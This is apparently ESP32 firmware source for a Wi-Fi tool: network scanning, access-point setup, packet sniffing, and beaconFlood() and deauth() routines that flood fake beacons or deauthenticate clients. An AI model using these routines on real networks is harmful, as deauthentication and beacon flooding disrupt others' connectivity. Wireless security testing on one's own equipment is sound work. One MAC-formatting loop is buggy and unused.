#include "WifiManager.h"


extern SnifferBuffer snifferBuffer = SnifferBuffer();

/*Deconstructor*/
WifiManager::~WifiManager(){
}

/*Constructor*/
WifiManager::WifiManager(){
	String mac = WiFi.macAddress();
	//01:23:45:67:89:ab
	_my_mac[0] = mac.substring(0,2).toInt();
	_my_mac[1] = mac.substring(3,5).toInt();
	_my_mac[2] = mac.substring(6,8).toInt();
	_my_mac[3] = mac.substring(9,11).toInt();
	_my_mac[4] = mac.substring(12,14).toInt();
	_my_mac[5] = mac.substring(15,17).toInt();

	_conected_to_wifi = false;
	_monitor_mode = false;

	_sta_ssid = "";
	_sta_ssid_pass = "";

	_ap_ssid = DEFAULT_AP_SSID;
	_ap_ssid_pass = DEFAULT_AP_SSID_PASS;
	_ap_channel = DEFAULT_AP_CHANNEL;
	_ap_hidden = DEFAULT_AP_HIDDEN;
	_ap_max_connections = DEFAULT_AP_MAX_CONNECTIONS;

  snifferBuffer_ptr = &snifferBuffer;
  resetWiFi();
}


void WifiManager::createAP(String ap_ssid, String ap_ssid_pass, uint8_t ap_channel, bool ap_hidden, uint8_t ap_max_connections){
	_ap_ssid = ap_ssid;
	_ap_ssid_pass = ap_ssid_pass;
	_ap_channel = ap_channel;
	_ap_hidden = ap_hidden;
	_ap_max_connections = ap_max_connections;

	WiFi.mode(WIFI_AP);
	WiFi.softAP(_ap_ssid, _ap_ssid_pass, _ap_channel, _ap_hidden, _ap_max_connections);

	Serial.printf("%s> SSID_STARTED\r\n", WIFI_MANAGER_LOG_HEADER);
}

void WifiManager::connectWiFi(String ssid, String pass){
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid.c_str(), pass.c_str());   // Conexión a la red WiFi
  uint8_t timeout = 0;
  while (WiFi.status() != WL_CONNECTED && timeout < 15) {
    delay(1000);
    Serial.println("Conectando a WiFi...");
    timeout++;
  }

  if(timeout >= 15){
    Serial.println("No se pudo conectar");
    _conected_to_wifi = false;
  } else {
    _sta_ssid = ssid;
    _sta_ssid_pass = pass;
    _conected_to_wifi = true;
  }
}

void WifiManager::randomMacAddr(MacAddr newMac) {
  for (int i = 0; i < 6; i++) {
    newMac[i] = static_cast<uint8_t>(random(256)); // Generar un número aleatorio entre 0 y 255
  }
}

void WifiManager::setMonitor(){
	// start Wifi sniffer
	WiFi.mode(WIFI_STA);
	_monitor_mode = true;
	esp_wifi_set_promiscuous(true);
}

bool WifiManager::isMonitor(){
	// start Wifi sniffer
	return _monitor_mode;
}


void WifiManager::sniffTraffic(bool sniffer_enable){
  if(sniffer_enable){
    esp_wifi_set_promiscuous_rx_cb(&SnifferBuffer_wifi_sniffer);  
  } else {
    esp_wifi_set_promiscuous_rx_cb(NULL);
  }
}


void WifiManager::resetWiFi(){
	WiFi.mode(WIFI_STA);
	WiFi.disconnect();

	_monitor_mode = false;
	esp_wifi_set_promiscuous(false);
}

int WifiManager::countSSID() {
	resetWiFi();
	delay(100);

	return WiFi.scanNetworks();
}

int WifiManager::listSSIDs(String *json_SSID) {
	resetWiFi();
	delay(100);

	*json_SSID = "[";
	unsigned int n = WiFi.scanNetworks();
	// WiFi.scanNetworks will return the number of networks found
	if (n > 0) {
		for (unsigned int i = 0; i < n; ++i) {
			unsigned int signal_strength_color = 0;

			if(WiFi.RSSI(i) <= -90){
				signal_strength_color = TFT_RED;
			} else if(WiFi.RSSI(i) <= -80){
				signal_strength_color = TFT_ORANGE;
			} else if(WiFi.RSSI(i) <= -70){
				signal_strength_color = TFT_YELLOW;
			} else if(WiFi.RSSI(i) <= -60){
				signal_strength_color = TFT_GREENYELLOW;
			} else {
				signal_strength_color = TFT_GREEN;
			}

			String wifi_security = "";

			switch(WiFi.encryptionType(i)){
				case WIFI_AUTH_OPEN:
					wifi_security = "OPEN";
					break;
				case WIFI_AUTH_WEP:
					wifi_security = "WEP";
					break;
				case WIFI_AUTH_WPA_PSK:
					wifi_security = "WPA";
					break;
				case WIFI_AUTH_WPA2_PSK:
					wifi_security = "WPA2";
					break;
				case WIFI_AUTH_WPA_WPA2_PSK:
					wifi_security = "WPA/2";
					break;
				case WIFI_AUTH_WPA2_ENTERPRISE:
					wifi_security = "WPA2-E";
					break;
				default:
					wifi_security = "UNKOWN";
					break;
			}
			
			String mac = "";
			for (int i = 0; i < 6; i++) {
				mac += String(mac[i], HEX);
				if (i < 5) {
					mac += ":";
				}
			}

			*json_SSID += "{\"r\":[";
			*json_SSID += "{\"s\":\"" + String(WiFi.BSSIDstr(i)) + "\",\"c\":\"" + TFT_WHITE + "\"},";
			*json_SSID += "{\"s\":\"" + String(WiFi.SSID(i)) + "\",\"c\":\"" + TFT_WHITE + "\"},";
			*json_SSID += "{\"s\":\"" + wifi_security + "\",\"c\":\"" + TFT_WHITE + "\"},";
			*json_SSID += "{\"s\":\"" + String(WiFi.RSSI(i)) + "\",\"c\":\"" + signal_strength_color + "\"}";
			*json_SSID += "]},";
			delay(10);
		}
	}
	Serial.println("");

	*json_SSID = json_SSID->substring(0,json_SSID->length()-1);
	*json_SSID += "]";
	return n;
}

String WifiManager::getBSSIDfromJSON(String *json_str, unsigned int position){
	StaticJsonDocument<4096> doc;
	DeserializationError error = deserializeJson(doc, *json_str);
	String rtr = "";
	if(position < doc.size()){
		rtr = doc[position]["r"][0]["s"].as<String>();
	}

	doc = NULL;
	return rtr;
}

void WifiManager::beaconFlood(String target_ssid, unsigned int time_of_attack) {
	//punto de acceso hidden
  createAP(DEFAULT_AP_SSID, DEFAULT_AP_SSID_PASS, DEFAULT_AP_CHANNEL, true, DEFAULT_AP_MAX_CONNECTIONS);
  
  unsigned long start_attack_time = millis();
	
	PacketSender sender;

	MacAddr mac = {1,2,3,4,5,6};
	while(millis() < start_attack_time+time_of_attack){
		String new_ssid = target_ssid + " " + (char)random(48,90);
    
		//randomMacAddr(mac);
		sender.beacon_bypassed(mac, new_ssid.c_str(), _ap_channel, false);	
		delay(10);	//delay de 10ms entre peticiones
	}
}

void parseBytes(const char* str, char sep, byte* bytes, int maxBytes, int base) {
    for (int i = 0; i < maxBytes; i++) {
        bytes[i] = strtoul(str, NULL, base);  // Convert byte
        str = strchr(str, sep);               // Find next separator
        if (str == NULL || *str == '\0') {
            break;                            // No more separators, exit
        }
        str++;                                // Point to next character after separator
    }
}


void WifiManager::deauth(String ap_mac, String sta_mac, unsigned int time_of_attack){
  createAP(DEFAULT_AP_SSID, DEFAULT_AP_SSID_PASS, DEFAULT_AP_CHANNEL, true, DEFAULT_AP_MAX_CONNECTIONS);
  
  MacAddr ap_addr;
  parseBytes(ap_mac.c_str(), ':', ap_addr, 6, 16);
  
  MacAddr sta_addr;
  parseBytes(sta_mac.c_str(), ':', sta_addr, 6, 16);
    
  unsigned long start_attack_time = millis();
  
  /*_monitor_mode = true;
  esp_wifi_set_promiscuous(true);*/
  
  PacketSender sender;
  while(millis() < start_attack_time+time_of_attack){
    sender.deauth_bypassed(sta_addr, ap_addr, ap_addr, 1, 1);  
    delay(10);  //delay de 10ms entre peticiones
  }
}

